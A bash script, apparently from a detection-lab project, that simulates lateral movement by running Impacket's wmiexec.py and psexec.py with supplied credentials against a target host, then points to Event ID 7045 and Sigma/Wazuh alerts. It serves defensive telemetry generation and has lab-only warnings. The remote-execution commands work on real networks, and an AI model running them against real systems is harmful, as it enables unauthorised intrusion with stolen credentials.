#!/usr/bin/env bash
#
# simulate_lateral_movement.sh
#
# Generates lateral-movement telemetry (PsExec-style and WMI) between two
# hosts in an ISOLATED LAB NETWORK ONLY, using credentials obtained during
# the brute-force simulation step. See scripts/README.md before running this.
#
# Usage: ./simulate_lateral_movement.sh <source_host> <target_ip> <username> <password>

set -euo pipefail

SOURCE_HOST="${1:-}"
TARGET_IP="${2:-}"
USERNAME="${3:-}"
PASSWORD="${4:-}"

if [[ -z "$SOURCE_HOST" || -z "$TARGET_IP" || -z "$USERNAME" || -z "$PASSWORD" ]]; then
    echo "Usage: $0 <source_host> <target_ip> <username> <password>"
    echo "Only run against hosts in your own isolated lab network, with lab credentials."
    exit 1
fi

echo "[*] Confirm this target is in your isolated lab network before continuing."
read -r -p "Type 'yes' to continue: " CONFIRM
if [[ "$CONFIRM" != "yes" ]]; then
    echo "Aborted."
    exit 1
fi

echo "[*] Lateral movement via WMI (wmiexec.py) from ${SOURCE_HOST} -> ${TARGET_IP}"
wmiexec.py "${USERNAME}:${PASSWORD}@${TARGET_IP}" "whoami && hostname"

echo "[*] Lateral movement via PsExec-style remote service (psexec.py) from ${SOURCE_HOST} -> ${TARGET_IP}"
psexec.py "${USERNAME}:${PASSWORD}@${TARGET_IP}" "whoami"

echo "[*] Done. Check for Event ID 7045 (service creation), WmiPrvSE.exe child processes, and the corresponding Sigma/Wazuh alerts."
